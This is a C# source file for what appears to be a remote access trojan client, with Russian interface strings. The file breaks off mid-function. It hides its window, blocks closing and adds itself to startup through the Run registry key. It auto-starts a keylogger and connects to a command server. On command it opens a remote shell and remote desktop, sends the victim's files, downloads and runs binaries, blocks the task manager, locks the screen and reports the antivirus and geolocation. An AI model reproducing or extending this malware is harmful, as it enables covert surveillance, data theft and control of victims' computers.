using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.Integration;
using Microsoft.Win32;
using System.Management;
using Client.Helpers;
using Client.Forms;
using Client.Helpers.Information;
using Client.Helpers.Networking;
using Client.Helpers.Services;
using Client.Helpers.Services.InputSimulator;
using Client.Helpers.Telepathy;
using System.Windows.Threading;
using System.Windows;
using Message = Client.Helpers.Telepathy.Message;

namespace Client
{
    public partial class MainWindow : Window
    {
        #region Connect Loop

        //Connect to server, then loop data receiving
        private async void ConnectLoop()
        {
            while (!Networking.MainClient.Connected)
            {
                await Task.Delay(50);
                Networking.MainClient.Connect(ClientSettings.DNS, Port);
            }

            while (Networking.MainClient.Connected)
            {
                await Task.Delay(Interval);
                GetData();
            }

            ConnectLoop();
        }

        #endregion Connect Loop

        #region DLL Imports

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi,
            SetLastError = true)]
        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength,
            int hwndCallback);

        #region Constants

        public const int WM_LBUTTONDOWN = 0x201;
        public const int WM_LBUTTONUP = 0x202;
        public const int WM_LBUTTONDBLCLK = 0x203;
        public const int WM_RBUTTONDOWN = 0x204;
        public const int WM_RBUTTONUP = 0x205;
        public const int WM_RBUTTONDBLCLK = 0x206;

        #endregion


        #endregion DLL Imports

        #region Declaration

        private readonly int Interval;
        private readonly int Port;
        private readonly string Admin;
        private string adm;
        private readonly bool Install;
        private readonly bool Startup;
        private bool ReceivingFile;
        private bool UpdateMode;
        private bool APActive;
        private bool ARActive;
        private bool SLActive;
        private string CurrentDirectory;
        private string FileToWrite;
        private string UpdateFileName;
        private readonly string InstallPath;
        private readonly string AudioPath;
        private readonly Chat C;
        private readonly ScreenLock SL = new ScreenLock();
        public NotifyIcon notifyIcon;

        #endregion Declaration

        #region Uninstall/Install

        //Uninstall client
        private void UninstallClient()
        {
            if (Install && Startup)
            {
                RegistryKey RK =
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RK.DeleteValue(Path.GetFileNameWithoutExtension(System.Windows.Forms.Application.ExecutablePath), false);
            }
        }

        //Install client
        private void InstallClient()
        {
            if (!Install) return;
            if (System.Windows.Forms.Application.ExecutablePath == InstallPath)
            {
                if (!Startup) return;
                RegistryKey RK =
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RK.DeleteValue(Path.GetFileNameWithoutExtension(System.Windows.Forms.Application.ExecutablePath), false);
                RK.SetValue(Path.GetFileNameWithoutExtension(System.Windows.Forms.Application.ExecutablePath), InstallPath);
                return;
            }

            File.Copy(System.Windows.Forms.Application.ExecutablePath, InstallPath, true);
            Process.Start(InstallPath);
            Process.GetCurrentProcess().Kill();
        }

        //Checks if .NET version is high enough
        private bool NetUpdated()
        {
            string Key = @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\";
            RegistryKey NDP = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(Key);
            int ReleaseNum = (int)NDP.GetValue("Release");
            return ReleaseNum >= 378389;
        }

        #endregion Uninstall/Install

        #region Form

        //Entry
        public MainWindow()
        {
            try
            {
                InitializeComponent();
                Interval = Convert.ToInt16(ClientSettings.UpdateInterval);
                Port = Convert.ToInt16(ClientSettings.Port);
                Admin = ClientSettings.Admin;
                if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase)) Install = true;
                if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase)) Startup = true;
                InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
                              AppDomain.CurrentDomain.FriendlyName;
                AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
                InstallClient();
                C = new Chat();

                notifyIcon = new NotifyIcon();
                notifyIcon.Text = "Чат с " + Admin;
                notifyIcon.Icon = Properties.Resources.icon;
                notifyIcon.Visible = true;
                notifyIcon.DoubleClick += new EventHandler(NotifyIcon_DoubleClick);
            }
            catch(Exception ex)
            {
                System.Windows.Forms.MessageBox.Show(ex.Message);
            }
        }

        private void NotifyIcon_DoubleClick(object sender, EventArgs e)
        {
            this.Dispatcher.Invoke(() => C.Visibility = Visibility.Visible);
        }

        //Prevent any closing of the form
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
                e.Cancel = true;
        }

        //Hide form on form load
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            string ExePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue("Client", ExePath);
                reg.Close();
            }
            catch{}
            Dispatcher.CurrentDispatcher.Invoke(Hide);
                StartAll(Keylogger.StartKeylogger);
                StartAll(ConnectLoop);
        }

        public delegate void FunctionAsync();
        public async void StartAll(FunctionAsync f)
        {
            await Task.Run(() => f());
        }


        #endregion Form

        #region GetData

        //Get data that has been sent to the server
        private void GetData()
        {
            Message Data;
            while (Networking.MainClient.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        Console.WriteLine("Connected");
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add((int)DataType.AdminType);
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ClientSettings.Admin));
                        Networking.MainClient.Send(ToSend.ToArray());
                        ToSend.Clear();
                        ToSend.Add((int)DataType.ClientTag);
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ClientSettings.ClientTag));
                        Networking.MainClient.Send(ToSend.ToArray());
                        ToSend.Clear();
                        ToSend.Add((int)DataType.AntiVirusTag);
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetAntivirus()));
                        Networking.MainClient.Send(ToSend.ToArray());
                        string OperatingSystemUnDetailed = ComputerInfo.GetWindowsVersion()
                            .Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
                        ToSend.Clear();
                        ToSend.Add((int)DataType.WindowsVersionTag);
                        ToSend.AddRange(Encoding.UTF8.GetBytes(OperatingSystemUnDetailed));
                        Networking.MainClient.Send(ToSend.ToArray());
                        break;

                    case EventType.Disconnected:
                        break;

                    case EventType.Data:
                        HandleData(Data.data);
                        break;
                }
        }

        //Handle data sent to client
        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        private void HandleData(byte[] RawData)
        {
            if (ReceivingFile)
            {
                try
                {
                    if (UpdateMode)
                    {
                        try
                        {
                            File.WriteAllBytes(
                                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
                                UpdateFileName, RawData);
                            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
                                          UpdateFileName);
                            KillClient();
                        }
                        catch { }

                        return;
                    }


                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    int i = 0;
                    while (File.Exists(FileToWrite))
                    {
                        string d = Path.GetDirectoryName(FileToWrite);
                        string n = Path.GetFileNameWithoutExtension(FileToWrite);
                        string e = Path.GetExtension(FileToWrite);
                        FileToWrite = d + "\\" + n + i + e;
                        i++;
                    }
                    File.WriteAllBytes(FileToWrite, RawData);

                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.Name + "}<" + "Папка с файлами" + ">[" + F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + ")fS";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + (F.Length / 1024).ToString("N0") + " КБ)fS";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int)DataType.FilesListType);
                    ToSend.AddRange(Encoding.UTF8.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                    CurrentDirectory = Directory;
                    ToSend.Clear();
                    ToSend.Add((int)DataType.CurrentDirectoryType);
                    ToSend.AddRange(Encoding.UTF8.GetBytes(CurrentDirectory));
                    Networking.MainClient.Send(ToSend.ToArray());
                    GetDrives();

                    ToSend.Clear();
                    ToSend.Add((int)DataType.NotificationType);
                    ToSend.AddRange(
                        Encoding.UTF8.GetBytes("Файл " + Path.GetFileName(FileToWrite) + " был выгружен."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch (Exception EX)
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int)DataType.NotificationType);
                    ToSend.AddRange(Encoding.UTF8.GetBytes("Error Downloading: " + EX.Message + ""));
                    Networking.MainClient.Send(ToSend.ToArray());
                }

                ReceivingFile = false;
                return;
            }

            string StringForm = string.Empty;
            try
            {
                StringForm = Encoding.UTF8.GetString(RawData);

                adm = GetSubstringByString("[admin", "admin]", StringForm);
                int d = StringForm.IndexOf("admin]");
                StringForm = StringForm.Substring(d + 6);
            }
            catch
            {
            }

            #region Non-Parameterized Commands
            if ((adm == Admin) || adm == "Админ")
            {
                switch (StringForm)
                {
                    case "KillClient":
                        KillClient();
                        break;

                    case "DisconnectClient":
                        DisconnectClient();
                        break;

                    case "GetProcesses":
                        GetProcesses();
                        break;

                    case "GetActivePorts":
                        GetActivePorts();
                        break;
                    
                    case "GetAppsInstalled":
                        GetAppsInstalled();
                        break;

                    case "GetComputerInfo":
                        GetComputerInfo();
                        break;

                    case "GoUpDir":
                        GoUpDir();
                        break;

                    case "GetStoredPasswords":
                        GetPasswords();
                        break;

                    case "ToggleAntiProcess":
                        ToggleAntiProcess();
                        break;

                    case "ToggleScreenlock":
                        ToggleScreenlock();
                        break;

                    case "OpenChat":
                        OpenChat();
                        break;

                    case "CloseChat":
                        CloseChat();
                        break;

                    case "StartRD":
                        StartRD();
                        break;

                    case "StopRD":
                        StopRD();
                        break;

                    case "StartAR":
                        StartAR();
                        break;

                    case "StopAR":
                        StopAR();
                        break;

                    case "StartKL":
                        StartKL();
                        break;

                    case "StopKL":
                        StopKL();
                        break;

                    case "StartRS":
                        StartRS();
                        break;

                    case "StopRS":
                        StopRS();
                        break;

                    case "StartUsageStream":
                        StartUsageStream();
                        break;

                    case "StopUsageStream":
                        StopUsageStream();
                        break;

                    case "ShutDown":
                        ShutDown();
                        break;

                    case "Reboot":
                        Reboot();
                        break;

                    case "SleepMode":
                        SleepMode();
                        break;

                    case "LogOff":
                        LogOff();
                        break;

                    case "LockUser":
                        LockUser();
                        break;

                }

                #endregion Non-Parameterized Commands

                #region Parameterized Commands

                if (StringForm.Contains("MsgBox"))
                    MsgBox(StringForm);
                else if (StringForm.Contains("EndProcess"))
                    EndProcess(StringForm);
                else if (StringForm.Contains("OpenWebsite"))
                    OpenWebsite(StringForm);
                else if (StringForm.Contains("GetDF"))
                    GetDF(StringForm);
                else if (StringForm.Contains("GetFile"))
                    GetFile(StringForm);
                else if (StringForm.Contains("StartFileReceive"))
                    StartFileReceive(StringForm);
                else if (StringForm.Contains("TryOpen"))
                    TryOpen(StringForm);
                else if (StringForm.Contains("DeleteFile"))
                    DeleteFile(StringForm);
                else if (StringForm.Contains("[<MESSAGE>]"))
                    Message(StringForm.Replace("[<MESSAGE>]", ""));
                else if (StringForm.Contains("[<TTS>]"))
                    TTS(StringForm.Replace("[<TTS>]", ""));
                else if (StringForm.Contains("[<COMMAND>]"))
                    Command(StringForm.Replace("[<COMMAND>]", ""));
            }
            #endregion Parameterized Commands
        }

        #endregion GetData

        #region Functions

        //Uninstalls, then kills client
        private void KillClient()
        {
            KeyloggerStream.Stop();
            //UninstallClient();
            try
            {
                Process.GetCurrentProcess().Kill();
            }
            catch
            {
                Environment.Exit(0);
            }
        }

        //ShutDown client
        private void ShutDown()
        {
            Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
            {
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }

        //Reboot client
        private void Reboot()
        {
            var cmd = new System.Diagnostics.ProcessStartInfo("shutdown.exe", "-r -t 0");
            cmd.CreateNoWindow = true;
            cmd.UseShellExecute = false;
            cmd.ErrorDialog = false;
            Process.Start(cmd);
        }

        //SleepMode client
        private void SleepMode()
        {
            System.Windows.Forms.Application.SetSuspendState(PowerState.Suspend, true, true);
        }


        [DllImport("user32")]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
        //LogOff client
        private void LogOff()
        {
            ExitWindowsEx(0, 0);
        }

        [DllImport("user32")]
        public static extern void LockWorkStation();
        //Lock client
        private void LockUser()
        {
            LockWorkStation();
        }

        //Disconnects client
        private void DisconnectClient()
        {
            Networking.MainClient.Disconnect();
        }

        //Toggles screenlocker
        private void ToggleScreenlock()
        {
            if (!SLActive)
            {
                SLActive = true;
                System.Windows.Forms.Cursor.Hide();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Экран пользователя заблокирован."));
                Networking.MainClient.Send(ToSend.ToArray());
                if (!SL.Visible)
                    SL.Show();
            }
            else
            {
                SLActive = false;
                System.Windows.Forms.Cursor.Show();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Экран пользователя разблокирован."));
                Networking.MainClient.Send(ToSend.ToArray());
                if (SL.Visible)
                    SL.Hide();
            }
        }


        private string Parser(bool a) { if (a) return "Выполняется"; else return "Приостановлено"; }
        //Gets running applications
        private void GetProcesses()
        {
            Process[] PL = Process.GetProcesses();

            List<string> ProcessList = new List<string>();
            foreach (Process P in PL)
            {
                try
                {
                    ProcessList.Add("p1" + P.ProcessName + "}p2" + P.Id + "{p3" + Parser(P.Responding) + ";p4" + P.MainWindowTitle + ">p5" + (P.PrivateMemorySize64 / 1024) + "<p6" + P.MainModule.FileName + "]");
                }
                catch { }
            }
            string[] StringArray = ProcessList.ToArray<string>();
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)DataType.ProcessType);
            string ListString = "";
            foreach (string Process in StringArray) ListString += "][" + Process;
            ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
            Networking.MainClient.Send(ToSend.ToArray());
        }


        private void GetActivePorts()
        {
            List<Port> a = Ports.GetNetStatPorts();
            List<string> ProcessList = new List<string>();


            foreach (var e in a)
            {
                ProcessList.Add("p1" + e.pid + "}p2" + e.process_name + "{p3" + e.protocol + ";p4" +  e.local_address + ">p5" +  e.remote_address + "<p6" + e.status + "]");
            }

            string[] StringArray = ProcessList.ToArray<string>();
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)DataType.ActivePorts);
            string ListString = "";
            foreach (string Process in StringArray) ListString += "][" + Process;
            ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
            Networking.MainClient.Send(ToSend.ToArray());
        }
        
        
        private void GetAppsInstalled()
        {
            List<string> AppsList = new List<string>();

            string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key))
            {
                foreach (string subkey_name in key.GetSubKeyNames())
                {
                    using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                    {
                        if (subkey.GetValue("DisplayName") != null)
                        {
                            string a = "";
                            if (subkey.GetValue("InstallDate") != null)
                            {
                                a = subkey.GetValue("InstallDate").ToString();
                                a = a.Substring(6, 2) + "." + a.Substring(4, 2) + "." + a.Substring(0, 4);
                            }
                            AppsList.Add("p1" + subkey.GetValue("DisplayName") + "}p2" + subkey.GetValue("Publisher") + "{p3" + a + ";");
                        }
                    }

                }
            }

            string[] StringArray = AppsList.ToArray<string>();
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)DataType.AppsInstalled);
            string ListString = "";
            foreach (string Process in StringArray) ListString += "][" + Process;
            ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
            Networking.MainClient.Send(ToSend.ToArray());
        }



        ////Prompts user to raise client to administrator
        //private void RaisePerms()
        //{
        //    Process P = new Process();
        //    P.StartInfo.FileName = Application.ExecutablePath;
        //    P.StartInfo.UseShellExecute = true;
        //    P.StartInfo.Verb = "runas";
        //    P.Start();
        //    try
        //    {
        //        Process.GetCurrentProcess().Kill();
        //    }
        //    catch
        //    {
        //        Environment.Exit(0);
        //    } //We don't want to uninstall client, so we just kill.
        //}


        //Shows a message box
        private void MsgBox(string Data)
        {
            string MessageBoxData = GetSubstringByString("<{", "}>", Data);
            string Text = GetSubstringByString("<", ">", MessageBoxData);
            string Header = GetSubstringByString("[", "]", MessageBoxData);
            string ButtonString = GetSubstringByString("{", "}", MessageBoxData);
            string IconString = GetSubstringByString("/", @"\", MessageBoxData);

            #region Button & Icon conditional statements

            MessageBoxButtons MBB = MessageBoxButtons.OK;
            MessageBoxIcon MBI = MessageBoxIcon.None;

            if (ButtonString.Equals("Abort Retry Ignore"))
                MBB = MessageBoxButtons.AbortRetryIgnore;
            else if (ButtonString.Equals("OK"))
                MBB = MessageBoxButtons.OK;
            else if (ButtonString.Equals("OK Cancel"))
                MBB = MessageBoxButtons.OKCancel;
            else if (ButtonString.Equals("Retry Cancel"))
                MBB = MessageBoxButtons.RetryCancel;
            else if (ButtonString.Equals("Yes No"))
                MBB = MessageBoxButtons.YesNo;
            else if (ButtonString.Equals("Yes No Cancel")) MBB = MessageBoxButtons.YesNoCancel;

            if (IconString.Equals("Asterisk"))
                MBI = MessageBoxIcon.Asterisk;
            else if (IconString.Equals("Error"))
                MBI = MessageBoxIcon.Error;
            else if (IconString.Equals("Exclamation"))
                MBI = MessageBoxIcon.Exclamation;
            else if (IconString.Equals("Hand"))
                MBI = MessageBoxIcon.Hand;
            else if (IconString.Equals("Information"))
                MBI = MessageBoxIcon.Information;
            else if (IconString.Equals("None"))
                MBI = MessageBoxIcon.None;
            else if (IconString.Equals("Question"))
                MBI = MessageBoxIcon.Question;
            else if (IconString.Equals("Stop"))
                MBI = MessageBoxIcon.Stop;
            else if (IconString.Equals("Warning")) MBI = MessageBoxIcon.Warning;

            #endregion Button & Icon conditional statements

            System.Windows.Forms.MessageBox.Show(Text, Header, MBB, MBI);
        }

        //Plays text to speech
        private void TTS(string Message)
        {
            try
            {
                using (SpeechSynthesizer Synth = new SpeechSynthesizer())
                {
                    Synth.SetOutputToDefaultAudioDevice();
                    Synth.Speak(Message);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int)DataType.NotificationType);
                    ToSend.AddRange(Encoding.UTF8.GetBytes("The message " + Message + " was played."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
            }
            catch { }
        }

        //Ends a specified process
        private void EndProcess(string Data)
        {
            string ToEnd = GetSubstringByString("<{", "}>", Data);
            try
            {
                Process P = Process.GetProcessById(Convert.ToInt32(ToEnd));
                P.Kill();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Процесс " + P.ProcessName + " был закончен."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Opens a website
        private void OpenWebsite(string Data)
        {
            string ToOpen = GetSubstringByString("<{", "}>", Data);
            try
            {
                Process.Start(ToOpen);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("The website " + ToOpen + " was opened."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        private void GetDrives()
        {
            string Info = string.Empty;
            var driveQuery = new ManagementObjectSearcher("select * from Win32_DiskDrive");
            foreach (ManagementObject d in driveQuery.Get())
            {
                var deviceId = d.Properties["DeviceId"].Value;
                var partitionQueryText = string.Format("associators of {{{0}}} where AssocClass = Win32_DiskDriveToDiskPartition", d.Path.RelativePath);
                var partitionQuery = new ManagementObjectSearcher(partitionQueryText);
                foreach (ManagementObject p in partitionQuery.Get())
                {
                    var logicalDriveQueryText = string.Format("associators of {{{0}}} where AssocClass = Win32_LogicalDiskToPartition", p.Path.RelativePath);
                    var logicalDriveQuery = new ManagementObjectSearcher(logicalDriveQueryText);
                    foreach (ManagementObject ld in logicalDriveQuery.Get())
                    {
                        var free = (float)(Convert.ToUInt64(ld.Properties["FreeSpace"].Value) / 1073741824);
                        var size = (float)(Convert.ToUInt64(ld.Properties["Size"].Value) / 1073741824);

                        Info += "][dI{" + Convert.ToString(ld.Properties["DeviceId"].Value) + "}dIdT{" // C:
                         + Convert.ToUInt32(ld.Properties["DriveType"].Value) + "}dTdF{"  // C: - 3
                         + free + "}dFdS{"
                         + size + "}dSdV{"
                         + Convert.ToString(ld.Properties["VolumeName"].Value) + "}dVdP{"
                         + (int)(100 * (size - free) / size) + "}dP";
                    }
                }
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)DataType.DriveInfo);
            ToSend.AddRange(Encoding.UTF8.GetBytes(Info));
            Networking.MainClient.Send(ToSend.ToArray());
        }

        //Gets directory files
        private void GetDF(string Data)
        {

            try
            {
                string Directory = GetSubstringByString("{", "}", Data);
                if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                string Files = string.Empty;
                DirectoryInfo DI = new DirectoryInfo(Directory);
                foreach (var F in DI.GetDirectories())
                    Files += "][{" + F.Name + "}<" + "Папка с файлами" + ">[" + F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + ")fS";
                foreach (FileInfo F in DI.GetFiles())
                    Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                             F.LastAccessTime.ToString("dd/MM/yyyy HH:mm") + "]fS(" + (F.Length / 1024).ToString("N0") + " КБ)fS";
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.FilesListType);
                ToSend.AddRange(Encoding.UTF8.GetBytes(Files));
                Networking.MainClient.Send(ToSend.ToArray());
                CurrentDirectory = Directory;
                ToSend.Clear();
                ToSend.Add((int)DataType.CurrentDirectoryType);
                ToSend.AddRange(Encoding.UTF8.GetBytes(CurrentDirectory));
                Networking.MainClient.Send(ToSend.ToArray());
                GetDrives();
            }
            catch (Exception EX)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Ошибка : " + EX.Message + ""));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }

        //Gets specified file
        private void GetFile(string Data)
        {
            try
            {
                string FileString = GetSubstringByString("{[", "E<E", Data);
                string ext = GetSubstringByString("E<E", "]}", Data);
                FileString += ext;
                byte[] FileBytes;
                if (ext != "Папка с файлами" && ext != ".log")
                {
                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int)DataType.FileType);

                    ToSend.AddRange(FileBytes);
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                else if (ext == ".log")
                {
                    string text = "";
                    FileInfo log = new FileInfo(FileString);
                    using (var streamReader = new StreamReader(log.Open(FileMode.Open, FileAccess.Read, FileShare.ReadWrite)))
                    {
                        text = streamReader.ReadToEnd();
                    }
                    FileBytes = Encoding.UTF8.GetBytes(text);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int)DataType.LogFileType);
                    ToSend.AddRange(FileBytes);
                    Networking.MainClient.Send(ToSend.ToArray());
                }
            }
            catch (Exception EX)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Ошибка загрузки: " + EX.Message + ""));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }



        //Starts file uploading process
        private void StartFileReceive(string Data)
        {
            try
            {
                Random R = new Random();
                FileToWrite = GetSubstringByString("{", "}", Data);
                if (FileToWrite.Contains("[UPDATE]"))
                {
                    UpdateMode = true;
                    UpdateFileName = FileToWrite.Replace("[UPDATE]", "");
                    if (UpdateFileName == AppDomain.CurrentDomain.FriendlyName)
                        UpdateFileName = "Updated" + R.Next(0, 1000);
                }

                ReceivingFile = true;
            }
            catch { }
        }

        //Tries to open a file
        private void TryOpen(string Data)
        {
            string ToOpen = GetSubstringByString("{", "}", Data);
            try
            {
                Process.Start(ToOpen);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Файл " + Path.GetFileName(ToOpen) + " был открыт."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch (Exception EX)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Error Opening: " + EX.Message + ""));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }

        //Deletes specified file
        private void DeleteFile(string Data)
        {
            try
            {
                string ToDelete = GetSubstringByString("{", "}", Data);
                File.Delete(ToDelete);
                List<byte> ToSend = new List<byte>();
                GetDF(CurrentDirectory);
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(
                    Encoding.UTF8.GetBytes("Файл " + Path.GetFileName(ToDelete) + " был удалён."));
                Networking.MainClient.Send(ToSend.ToArray());

            }
            catch (Exception EX)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Error Deleting: " + EX.Message + ""));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }

        //Updates chat box (if open) with a new message
        private void Message(string Message)
        {

            try
            {
                this.Dispatcher.Invoke(() =>
                {
                    OpenChat(); 
                    System.Windows.Controls.ContentControl t = new System.Windows.Controls.ContentControl();
                    t.Content = Message + Environment.NewLine + DateTime.Now.ToString("HH:mm");
                    Style style = C.FindResource("BubbleLeftStyle") as Style;
                    t.Style = style;
                    C.chatPlace.Children.Add(t);
                    C.title.Text = "Чат c " + Admin;
                });
            }
            catch (Exception ex)
            {
                System.Windows.Forms.MessageBox.Show(ex.Message + " " + ex.TargetSite + " " + ex.Source + " " + ex.StackTrace);
            }

        }

        //Writes command to shell 
        private void Command(string Command)
        {
            RemoteShellStream.WriteLine = true;
            RemoteShellStream.Input = Command;
        }

        //Gets computer information
        private void GetComputerInfo()
        {
            string ListString = "";
            List<string> ComputerInfoList = new List<string>();
            try
            {
                ComputerInfo.GetGeoInfo();
            }
            catch { }

            ComputerInfoList.Add("Имя компьютера: " + ComputerInfo.GetName());
            ComputerInfoList.Add("ЦП: " + ComputerInfo.GetCPU());
            ComputerInfoList.Add("Видеокарта: " + ComputerInfo.GetGPU());
            ComputerInfoList.Add("Объём оперативной памяти (Мб): " + ComputerInfo.GetRamAmount());
            ComputerInfoList.Add("Антивирус: " + ComputerInfo.GetAntivirus());
            ComputerInfoList.Add("Операционная система: " + ComputerInfo.GetWindowsVersion());
            ComputerInfoList.Add("Страна: " + ComputerInfo.GetCountry());
            ComputerInfoList.Add("Регион: " + ComputerInfo.GetRegionName());
            ComputerInfoList.Add("Город: " + ComputerInfo.GetCity());
            foreach (string Info in ComputerInfoList.ToArray()) ListString += "," + Info;
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)DataType.InformationType);
            ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
            Networking.MainClient.Send(ToSend.ToArray());
        }

        //Gets stored passwords
        private void GetPasswords() { }

        //Goes up directory
        private void GoUpDir()
        {
            try
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add(7); //Directory Up Type
                CurrentDirectory = Directory.GetParent(CurrentDirectory).ToString();
                ToSend.AddRange(Encoding.UTF8.GetBytes(CurrentDirectory));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Starts or stops anti-process (task manager, etc.)
        private void ToggleAntiProcess()
        {
            if (!APActive)
            {
                APActive = true;
                AntiProcess.StartBlock();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Started Anti-Process."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (APActive)
            {
                APActive = false;
                AntiProcess.StopBlock();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Stopped Anti-Process."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }

        //Starts remote shell
        private void StartRS()
        {
            RemoteShellStream.Start();
        }

        //Stops remote shell
        private void StopRS()
        {
            RemoteShellStream.Stop();
        }

        //Starts hardware usage stream
        private void StartUsageStream()
        {
            HardwareUsageStream.Start();
        }

        //Stops hardware usage stream
        private void StopUsageStream()
        {
            HardwareUsageStream.Stop();
        }

        //Starts remote desktop
        private void StartRD()
        {
            RemoteDesktopStream.Start();
        }

        //Stops remote desktop
        private void StopRD()
        {
            RemoteDesktopStream.Stop();
        }

        //Starts keylogger
        private void StartKL()
        {
            KeyloggerStream.Start();
        }

        //Stops keylogger
        private void StopKL()
        {
            KeyloggerStream.Stop();
        }

        //Opens chat
        public void OpenChat()
        {
            if (C.Visibility != Visibility.Visible)
            {
                ElementHost.EnableModelessKeyboardInterop(C);
                C.Show();
            }
        }

        //Closes chat
        private void CloseChat()
        {
